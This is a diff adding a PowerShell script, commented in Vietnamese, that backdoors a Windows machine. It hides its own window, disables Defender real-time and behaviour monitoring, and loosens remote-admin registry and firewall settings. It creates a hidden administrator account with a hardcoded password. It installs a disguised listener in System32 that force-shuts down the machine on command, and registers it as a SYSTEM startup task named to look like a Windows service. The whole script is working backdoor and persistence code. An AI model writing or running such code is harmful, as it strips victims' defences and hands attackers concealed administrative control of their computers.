@@ -1,0 +1,59 @@
+# --- 1. ĐOẠN MÃ TỰ ẨN CỬA SỔ (CHẠY NGẦM) ---
+$hideWindow = @'
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'@
+$type = Add-Type -MemberDefinition $hideWindow -Name "Win32ShowWindow" -Namespace Win32 -PassThru
+$type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
+
+# --- 2. CẤU HÌNH ---
+$MyUser = "Support_Admin"
+$MyPass = "P@ssw0rd123"
+$Port = 9999
+$ErrorActionPreference = 'SilentlyContinue'
+
+# --- 3. VÔ HIỆU HÓA DEFENDER (CHẠY ẨN) ---
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+
+# --- 4. MỞ KHÓA REGISTRY & FIREWALL ---
+$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+New-ItemProperty -Path $RegPath -Name "LocalAccountTokenFilterPolicy" -Value 1 -PropertyType DWord -Force | Out-Null
+
+netsh advfirewall firewall set rule group="remote administration" new enable=yes | Out-Null
+netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes | Out-Null
+netsh advfirewall firewall add rule name="Win_Update_Service" dir=in action=allow protocol=TCP localport=$Port | Out-Null
+
+# --- 5. TẠO USER ADMIN ẨN ---
+$SecurePass = ConvertTo-SecureString $MyPass -AsPlainText -Force
+New-LocalUser -Name $MyUser -Password $SecurePass | Out-Null
+Add-LocalGroupMember -Group "Administrators" -Member $MyUser | Out-Null
+
+$LogonRegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+if (-not (Test-Path $LogonRegPath)) { New-Item -Path $LogonRegPath -Force | Out-Null }
+New-ItemProperty -Path $LogonRegPath -Name $MyUser -Value 0 -PropertyType DWord -Force | Out-Null
+
+# --- 6. CÀI ĐẶT LISTENER CHẠY NGẦM VĨNH VIỄN ---
+$ListenerPath = "C:\Windows\System32\win_sys_log.ps1"
+$ListenerCode = @"
+`$hide = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
+Add-Type -MemberDefinition `$hide -Name "Win32" -Namespace Win32 | Out-Null
+[Win32.Win32]::ShowWindow((Get-Process -Id `$PID).MainWindowHandle, 0) | Out-Null
+`$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $Port)
+`$listener.Start()
+while(`$true) {
+    try {
+        `$client = `$listener.AcceptTcpClient()
+        `$reader = New-Object System.IO.StreamReader(`$client.GetStream())
+        if(`$reader.ReadLine() -eq "SHUTDOWN_NOW") { shutdown.exe /s /f /t 0 }
+        `$client.Close()
+    } catch {}
+}
+"@
+Set-Content -Path $ListenerPath -Value $ListenerCode
+
+# --- 7. TẠO TASK TỰ CHẠY KHI KHỞI ĐỘNG ---
+$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $ListenerPath"
+$Trigger = New-ScheduledTaskTrigger -AtStartup
+$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+Register-ScheduledTask -TaskName "WindowsSystemHealthProvider" -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
